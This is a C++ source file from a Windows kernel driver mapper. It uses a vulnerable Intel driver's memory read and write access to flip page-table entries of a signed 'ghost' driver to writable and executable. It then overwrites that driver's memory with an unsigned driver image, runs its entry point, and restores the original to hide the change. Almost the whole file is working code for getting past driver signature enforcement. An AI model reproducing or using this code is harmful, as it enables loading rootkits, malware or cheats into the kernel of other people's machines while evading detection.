#include <Windows.h>
#include <utils.hpp>
#include <intel_driver.hpp>
#include "pte.h"
#include <portable_executable.hpp>
#include <vector>
#include "config.h"
#include "restore.h"
#include "AutoFree.h"


void RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta) {
	for (const auto& current_reloc : relocs) {
		for (auto i = 0u; i < current_reloc.count; ++i) {
			const uint16_t type = current_reloc.item[i] >> 12;
			const uint16_t offset = current_reloc.item[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64)
				*reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
		}
	}
}

// Fix cookie by @Jerem584
bool FixSecurityCookie(void* local_image, uint64_t kernel_image_base)
{
	auto headers = portable_executable::GetNtHeaders(local_image);
	if (!headers)
		return false;

	auto load_config_directory = headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
	if (!load_config_directory)
	{
		Log(L"[+] Load config directory wasn't found, probably StackCookie not defined, fix cookie skipped" << std::endl);
		return true;
	}

	auto load_config_struct = (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
	auto stack_cookie = load_config_struct->SecurityCookie;
	if (!stack_cookie)
	{
		Log(L"[+] StackCookie not defined, fix cookie skipped" << std::endl);
		return true; // as I said, it is not an error and we should allow that behavior
	}

	stack_cookie = stack_cookie - (uintptr_t)kernel_image_base + (uintptr_t)local_image; //since our local image is already relocated the base returned will be kernel address

	if (*(uintptr_t*)(stack_cookie) != 0x2B992DDFA232) {
		Log(L"[-] StackCookie already fixed!? this probably wrong" << std::endl);
		return false;
	}

	Log(L"[+] Fixing stack cookie" << std::endl);

	auto new_cookie = 0x2B992DDFA232 ^ GetCurrentProcessId() ^ GetCurrentThreadId(); // here we don't really care about the value of stack cookie, it will still works and produce nice result
	if (new_cookie == 0x2B992DDFA232)
		new_cookie = 0x2B992DDFA233;

	*(uintptr_t*)(stack_cookie) = new_cookie; // the _security_cookie_complement will be init by the driver itself if they use crt
	return true;
}

bool ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports) {
	for (const auto& current_import : imports) {
		ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
		if (!Module) {
			std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
			return false;
		}

		for (auto& current_function_data : current_import.function_datas) {
			uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);

			if (!function_address) {
				//Lets try with ntoskrnl
				if (Module != intel_driver::ntoskrnlAddr) {
					function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
					if (!function_address) {
						std::cout << "[-] Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")" << std::endl;
						return false;
					}
				}
			}

			*current_function_data.address = function_address;
		}
	}

	return true;
}

bool MapDriver(HANDLE IntelDrvHandle, BYTE* RawImage)
{

	const PIMAGE_NT_HEADERS64 NtHeaders = portable_executable::GetNtHeaders(RawImage);
	uint32_t ImageSize = NtHeaders->OptionalHeader.SizeOfImage;

	// Allocate local memory for driver image amd buffer for original driver image 
	void* LocalBase = VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!LocalBase)
		return false;
	AutoFree FreeLocalBase(LocalBase);
	void* OriginalMemory = VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!OriginalMemory)
		return false;
	AutoFree FreeOriginalMemory(OriginalMemory);

	// Find kernel base of ghost driver
	uint64_t GhostDriverBase = utils::GetKernelModuleAddress("dump_dumpfve.sys");
	if (!GhostDriverBase)
	{
		Log(L"[-] failed to resolve base of ghost driver...\n");
		return false;
	}

	// copy headers of target driver to local base 
	memcpy(LocalBase, RawImage, NtHeaders->OptionalHeader.SizeOfHeaders);

	// copy sections of target driver to local base 
	const PIMAGE_SECTION_HEADER CurrentSection = IMAGE_FIRST_SECTION(NtHeaders);

	for (auto i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i) {
		if ((CurrentSection[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
			continue;
		auto LocalSection = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(LocalBase) + CurrentSection[i].VirtualAddress);
		memcpy(LocalSection, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(RawImage) + CurrentSection[i].PointerToRawData), CurrentSection[i].SizeOfRawData);
	}

	// apply relocations on local base 
	RelocateImageByDelta(portable_executable::GetRelocs(LocalBase), GhostDriverBase - NtHeaders->OptionalHeader.ImageBase);

	if (!FixSecurityCookie(LocalBase, GhostDriverBase))
	{
		Log(L"[-] Failed to fix cookie" << std::endl);
		return false;
	}

	// patch and correct imports  
	if (!ResolveImports(IntelDrvHandle, portable_executable::GetImports(LocalBase))) {
		Log(L"[-] Failed to resolve imports" << std::endl);
		return false;
	}

	uint64_t GhostDriverEnd = ((ULONG_PTR)GhostDriverBase + ImageSize);

	// find kernel base
	uint64_t KernelBase = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (!KernelBase)
	{
		return false;
	}
	// search for MiGetPteAddress signature in ntos
	uint64_t PteBaseAddress = FindMiGetPteSigAddress(KernelBase);
	if (!PteBaseAddress)
	{
		Log(L"[*] failed to find MiGetPteAddress signature\n");
		return false;
	}
	Log(L"[*] MiGetPteAddress signature found : 0x" << std::hex << PteBaseAddress << std::endl);

	// mark ghost driver range as rwx 
	std::vector<pte> OriginalPtes;
	for (uint64_t CurrentAddress = GhostDriverBase; CurrentAddress < GhostDriverEnd; CurrentAddress += USN_PAGE_SIZE)
	{
		uint64_t PteAddress = (uint64_t)GetPTEForVA(IntelDrvHandle, CurrentAddress,PteBaseAddress);

		pte PteMemory;
		if (!intel_driver::ReadMemory(IntelDrvHandle, PteAddress, &PteMemory, sizeof(pte)))
		{
			Log(L"[-] failed to read ghost driver pte" << std::endl);
			return false;
		}
		OriginalPtes.push_back(PteMemory);
		
		PteMemory.nx = false;
		PteMemory.rw = true;
		if (!intel_driver::WriteMemory(IntelDrvHandle, PteAddress, &PteMemory, sizeof(pte)))
		{
			Log(L"[-] failed to patch ghost driver pte" << std::endl);
			return false;
		}
	}
	Log(L"[*] marked ghost driver pages as rwx" << std::endl);
	// our target driver is ready , write over the ghost driver memory 		pte PteMemory;
	if (!intel_driver::ReadMemory(IntelDrvHandle, GhostDriverBase, OriginalMemory, ImageSize))
	{
		Log(L"[-] failed to read ghost driver pte" << std::endl);
		return false;
	}

	
	if (!intel_driver::WriteMemory(IntelDrvHandle, GhostDriverBase, LocalBase, ImageSize))
	{
		Log(L"[-] Failed to write local image to remote image" << std::endl);
		return false;
	}
	Log(L"[*] wrote target driver to signed memory" << std::endl);

	uint64_t TargetDriverEntry = GhostDriverBase + NtHeaders->OptionalHeader.AddressOfEntryPoint;
	NTSTATUS status = 0;
	if (!intel_driver::CallKernelFunction(IntelDrvHandle, &status, TargetDriverEntry, NULL, NULL)) {
		Log(L"[*] failed to call driver entry of target driver" << std::endl);
		return false;
	}
	Log(L"[*]  DriverEntry of mapped driver was successfuly executed!" << std::endl);

	// restore original driver image and page table entries 
	// comment this out or use it differently if you create a thread in your entry 
	// an example would be using a shared event to sync when your driver finished it's work , only then restore 
	RestoreOriginalDriver(IntelDrvHandle, GhostDriverBase, OriginalMemory, ImageSize, std::move(OriginalPtes), PteBaseAddress);


	return true;
}



